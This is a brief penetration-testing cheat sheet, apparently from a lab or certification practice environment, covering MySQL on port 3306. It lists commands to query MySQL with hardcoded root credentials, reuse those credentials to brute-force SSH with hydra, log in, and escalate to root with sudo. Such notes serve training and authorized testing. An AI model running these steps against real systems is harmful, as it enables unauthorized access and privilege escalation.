# MySQL: Port 3306

1. Run SQL queries in a non-interactive shell
   
    ```bash
    mysql -uroot -pPassword123 -e 'show databases;'
    ```

2. Using MySQL credentials attempt to SSH into other machines

    ```bash
    grep -v '^#' /etc/ssh/sshd_config | uniq
    hydra -l username -p Password123 10.11.1.71 ssh
    ssh username@10.11.1.71
    ```

    ```bash
    id
    sudo -l
    sudo su
    id
    ```

    ```bash
    su username
    ```
